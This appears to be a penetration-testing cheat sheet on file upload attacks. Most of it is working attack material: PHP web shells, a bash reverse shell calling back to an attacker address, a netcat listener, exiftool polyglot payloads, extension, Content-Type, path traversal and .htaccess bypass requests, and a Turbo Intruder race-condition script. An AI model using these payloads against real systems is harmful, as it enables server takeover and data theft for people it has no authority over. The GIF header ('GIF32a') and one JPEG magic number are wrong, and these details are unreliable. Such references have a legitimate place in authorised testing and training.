---
title: File Upload Attack
desc: 
tags: [Burp, Exiftool, File, Netcat, Reverse, Shell, Upload, Web]
alts: [OS-Command-Injection, Reverse-Shell]
render_with_liquid: false
---

## Prepare a Payload

- **Web Shell**

    For example, the file name is "exploit.php".

    Simply showing the result of 'whoami'.

    ```php
    <?php echo system('whoami'); ?>
    ```

    This shows the content of "/etc/passwd".

    ```php
    <?php echo file_get_contents('/etc/passwd');  ?>
    ```

    Or you can use more useful payload with query parameter e.g. "/exploit.php?cmd=whoami"

    ```php
    <?php echo system($_GET['cmd']); ?>
    ```

- **Reverse Shell**

    ```php
    <?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
    ```

    Or download the payload from GitHub.

    ```sh
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

    # Edit some variables in the payload
    $ip = '<attacker-ip>'
    $port = 4444
    ```

    You need to open listener for getting a shell.

    ```sh
    nc -lvnp 4444
    ```

    After uploading it, reload the page in which the payload uploaded e.g. "/upload/shell.php".

- **Polyglot using Exiftool**

    It's assumed that you have an arbitrary image file.

    ```sh
    exiftool -Comment="<?php system('ls'); ?>" example.png
    exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.png
    exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
    ```

<br />

## Bypass Techniques

Upload the exploit files in the target website e.g. the profile picture's upload form.  
In most cases, you need to bypass the file validation.

- **File Extensions**

    If you cannot upload the payload with ".php", modify the extension and try it.

    ```
    exploit.php
    exploit.php3
    exploit.php4
    exploit.php5
    exploit.phtml
    exploit.phar

    exploit.php.
    exploit.php.jpg
    exploit.php.png
    exploit%2Ephp
    exploit.p.phphp
    exploit.php%00.jpg
    exploit.php%0d%0a.jpg
    exploit.pHp
    exploit.gif.pHp
    exploit.jpg.php
    exploit.png.php
    ```

- **Content-Types**

    If you cannot upload with "Content-Type: application/x-php", try changing it to **"Content-Type: image/jpeg"**.

    ```
    POST /upload HTTP/1.1
    ...

    ------abcdefghijk
    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
    Content-Type: image/jpeg

    <?php echo system($_GET['cmd']); ?>

    ------abcdefghijk
    ```

- **Path Traversal with the File Name**

    You may be able to edit the upload location by changing the **"filename"**.

    ```
    POST /upload HTTP/1.1
    ...

    ------abcdefghijk
    Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
    Content-Type: application/x-php

    <?php echo system($_GET['cmd']); ?>

    ------abcdefghijk
    ```

- **Server Configurations**

    You may be able to override the ".htaccess".

    ```
    POST /upload HTTP/1.1
    ...

    ------abcdefghijk
    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
    Content-Type: text/plain

    AddType application/x-httpd-php .abc

    ------abcdefghijk
    ```

- **Camouflage as Image Files**

    You may be able to bypass exif_imagetype() of PHP by editing the contents in the payload as image file.

    ```php
    // exploit.php

    GIF32a
    <?php echo system($_GET['cmd']); ?>
    ```

- **Bypass the Filter (Client-Side & Server-Side)**

    If the target website uses filter JavaScript around file uploading, you may be able to bypass it by using Burp Suite.

    ```sh
    On Burp Suite, click "Proxy" tab and "Options".

    # Client-Side
    1. Navigate to "Intercept Client Requests" section, click on the top line ("File extension"...) then click "Edit".
    2. The popup will open.
    3. On the popup, find and remove the "|^js$" in the "Match condition", then save the filter.

    # Server-Side
    1. Navigate to "Intercept Server Requests" section and check "Intercept responses based on...".

    # ----------------------------------------------

    1. Turn the intercept on.
    2. On browser, press Ctrl+F5 (hard refresh) to reload the page.
    3. If you found the filtering file (.js), drop it.
    ```

- **Race Conditions using Turbo Intruder**

    ```python
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=10,)

        request_post = '''POST /avatar/upload HTTP/1.1
    Host: vulnerable.com
    ...
    ...
    Connection: close

    ------abcdefghi
    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
    Content-Type: application/x-php

    <?php echo file_get_contents('/etc/passwd');  ?>

    ------abcdefghijk--

    '''

        request_get = '''GET /files/avatars/exploit.php HTTP/1.1
    Host: vulnerable.com
    ...
    ...
    Connection: close


    '''

        engine.queue(request_post, gate='race1')
        for i in range(5):
            engine.queue(request_get, gate='race1')


        engine.openGate('race1')
        engine.complete(timeout=60)
        


    def handleResponse(req, interesting):
        table.add(req)
    ```

<br />

## Other Tips

- **Magic Numbers**

    ```sh
    # PNG
    89 50 4E 47 ...

    # JPEG
    FF D8 DD E0 ...

    # JPG
    FF D8 FF EE ...
    ```